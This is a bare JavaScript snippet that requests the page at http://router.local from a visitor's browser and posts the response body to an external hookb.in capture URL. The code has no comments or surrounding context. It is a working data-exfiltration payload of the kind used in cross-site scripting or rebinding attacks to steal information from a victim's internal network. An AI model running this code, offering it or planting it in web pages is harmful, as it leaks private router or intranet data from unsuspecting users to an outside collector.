const http = new XMLHttpRequest();
http.addEventListener('load', function (event) {
    const xhr = new XMLHttpRequest();
    xhr.open('POST', 'https://hookb.in/nP0RO6rjzOTZ7Qrrd2Z1', true);
    xhr.setRequestHeader('Content-type', 'application/json');
    xhr.send(JSON.stringify(http.responseText));
});
http.open('Get', 'http://router.local');
http.send();
